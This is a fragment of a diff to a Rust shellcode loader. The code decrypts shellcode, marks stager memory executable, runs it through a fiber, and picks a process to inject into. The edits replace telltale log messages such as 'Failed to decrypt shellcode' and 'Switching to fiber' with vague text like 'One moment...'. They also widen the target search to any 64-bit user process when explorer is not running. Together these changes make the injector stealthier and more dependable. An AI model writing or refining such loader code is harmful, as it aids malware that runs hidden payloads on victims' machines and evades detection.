@@ -227,7 +227,7 @@ fn main() -> Result<()> {
                 s
             },
             Err(_) => {
-                println!("[-] Failed to decrypt shellcode (Key mismatch?)");
+                println!("[-] Failed 810.");
                 return Ok(());
             }
         };
@@ -272,7 +272,7 @@ fn main() -> Result<()> {
                     &mut old_protect,
                 )?;
                 
-                println!("[+] Stager memory ready (RX). Switching to fiber...");
+                println!("[+] One moment...");
 
                 // create fiber w/ shellcode addr as entry
                 type FiberStartRoutine = unsafe extern "system" fn(*mut c_void);
@@ -366,7 +366,6 @@ fn main() -> Result<()> {
 
                 // if spoof did not work, fallback
                 if _is_admin {
-                     // println!("[+] Initialized!");
                 }
                 
                 // find target process
@@ -376,8 +375,8 @@ fn main() -> Result<()> {
                         None => return Ok(()),
                     }
                 } else {
-                    // find user process
-                    match find_remote::find_user_process_pid() {
+                    // if explorer isnt running, find ANY 64-bit user process
+                    match find_remote::give_me_anything() {
                         Some(pid) => pid,
                         None => return Ok(()),
                     }
